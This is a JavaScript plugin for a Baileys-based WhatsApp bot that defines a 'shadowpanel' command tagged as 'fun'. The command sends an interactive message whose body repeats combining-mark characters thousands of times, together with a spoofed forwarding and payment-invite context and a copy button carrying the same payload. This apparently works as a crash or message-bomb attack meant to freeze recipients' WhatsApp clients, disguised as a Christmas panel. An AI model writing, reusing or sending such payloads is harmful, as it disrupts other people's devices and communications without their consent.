import { generateWAMessageFromContent, prepareWAMessageMedia } from '@whiskeysockets/baileys'

let handler = async (m, { conn }) => {
  // Banner (big image) and small red thumbnail
  const bannerUrl = 'https://files.catbox.moe/r5f3xk.jpg'            // grande arriba
  const miniaturaUrl = 'https://files.catbox.moe/r5f3xk.jpg'  // rojo pequeño (reemplaza)

  const media = await prepareWAMessageMedia({ image: { url: bannerUrl } }, { upload: conn.waUploadToServer })
  const thumb = (await conn.getFile(miniaturaUrl)).data // Buffer para jpegThumbnail

  const cargaTexto = "i ᡃ⃝ᡃ⃝ᡃ⃝...".repeat(5000) + " ...".repeat(5000)

  // 1) Panel interactivo con banner
  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            isForwarded: true,
            forwardingScore: 1973,
            businessMessageForwardInfo: { businessOwnerJid: conn.user.jid },
            participant: conn.user.jid,
            remoteJid: "status@broadcast",
            quotedMessage: {
              paymentInviteMessage: { serviceType: "UPI", expiryTimestamp: Date.now() }
            }
          },
          header: { hasMediaAttachment: true, imageMessage: media.imageMessage },
          body: { text: cargaTexto },
          footer: { text: "⚔️ Shadow-BOT-MD • Panel navideño 🎄" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Abrir panel 💚",
                  url: "https://www.whatsapp.com/android"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Copiar carga interactiva",
                  id: "shadow-copy",
                  copy_code: cargaTexto
                })
              }
            ]
          }
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(m.chat, content, { userJid: m.sender })
  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

  // 2) Documento pequeño con thumbnail rojo debajo (como en tu captura)
  await conn.sendMessage(m.chat, {
    document: { url: 'https://example.com/Choso-MD.pdf' }, // usa tu URL real o un Buffer
    fileName: 'Choso-MD🔥.pdf',
    mimetype: 'application/pdf',
    caption: "Selecciona el servicio al que deseas subir tu archivo.\nPOWERED BY XZZSY26",
    jpegThumbnail: thumb // miniatura roja
  }, { quoted: m })

  // 3) Botones de acción como mensaje aparte (lista/panel/copiar comando)
  await conn.sendMessage(m.chat, {
    text: "Elige una opción:",
    buttons: [
      { buttonId: 'abrir_lista', buttonText: { displayText: 'Abrir lista' }, type: 1 },
      { buttonId: 'abrir_panel', buttonText: { displayText: 'Abrir panel' }, type: 1 },
      { buttonId: 'copiar_cmd', buttonText: { displayText: 'Copiar comando' }, type: 1 }
    ],
    headerType: 1
  }, { quoted: m })
}

handler.help = ['shadowpanel']
handler.tags = ['fun']
handler.command = ['shadowpanel']
handler.register = true

export default handler
